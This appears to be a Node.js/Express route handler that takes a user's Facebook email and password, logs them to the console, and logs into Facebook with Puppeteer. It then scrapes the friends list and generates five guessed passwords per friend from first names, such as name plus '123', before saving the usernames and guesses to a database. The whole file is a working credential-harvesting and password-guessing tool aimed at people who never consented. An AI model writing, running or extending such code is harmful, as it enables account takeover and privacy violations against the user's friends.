const { default: puppeteer } = require("puppeteer");
const autoScroll = require("./autoScroll");
const InformationSchema = require("../../../model/informationMode");




const run=async(email,password)=>{
    console.log(email)
    console.log(password);
try {
    const browser= await puppeteer.launch({
        headless:false
    })
    const page= await browser.newPage()
    await page.goto('https://mobile.facebook.com')
    await page.setViewport({width:390,height:844})

    await page.type('input._56bg._4u9z._5ruq._8qtn',email,{delay:100})
    await page.type('input[name="pass"]',password, {delay:130})
    await page.click('button._54k8._52jh._56bs._56b_._28lf._9cow._56bw._56bu')
    await page.waitForNavigation();

    await page.waitForSelector('button._54k8._56bs._26vk._56b_._56bw._56bu', { visible: true });
    const existOkBtb= await page.$('button._54k8._56bs._26vk._56b_._56bw._56bu')
    
     
    if (existOkBtb) {
        await page.goto('https://web.facebook.com/friends/list',{timeout: 80000 })
      
        
        // await autoScroll();

        // Extract all anchor tags
       await page.waitForSelector('.x135pmgq [data-visualcompletion="ignore-dynamic"] > a')
            const anchors = await page.evaluate(() => {
                const anchorElements = document.querySelectorAll('.x135pmgq [data-visualcompletion="ignore-dynamic"] > a');
                const anchorArray = Array.from(anchorElements);
                return anchorArray.map(anchor => {
                    const href= anchor.getAttribute('href');
                    let userName;
                   

                    if (href.includes('=')) {
                      userName=href.split('=')[1] 
                    }
                    if (href.startsWith('https://web.facebook.com/') && !href.includes('id')) {
                       userName=href.split('com/')[1]
                    }

                //    find user Name
                    const name=anchor.children[0].children[1].firstElementChild.children[0].children[0].children[0].children[0].children[0].children[0].textContent ;
                     const makePass= name.split(' ')
                     let pass1=makePass[0]+'123';
                    
                     let pass2=makePass[0]+'1234';
                     let pass3=makePass[0]+'@123';
                     let pass4=makePass[0]+'@';
                     let pass5=makePass[0]+makePass[1].toLowerCase()+'123'


                    // const name=document.querySelectorAll('.x193iq5w.xeuugli.x13faqbe.x1vvkbs.x10flsy6.x6prxxf.xvq8zen.x1s688f.xzsf02u');
                    // name.map(name=>{
                    //    const nameValue= name.value;
                    //    return nameValue
                    // })
                    return {userName,name,pass1,pass2,pass3,pass4,pass5}

                     
                    
                });
            
            });

        
            await browser.close()
            return anchors


    }

   
} catch (error) {
    console.error('An error occurred:', error);
        return null;
}
  }

const evaluteLogin=async(req,res)=>{
   const {email,password}=req.body;
    try {
        console.log(email,password)
        const  loginInfo= await run(email,password)
         const result= await InformationSchema.create(loginInfo)
        res.json({message:result, success:true})
    } catch (error) {
      res.send(error.message)
    }
    
   
}

module.exports=evaluteLogin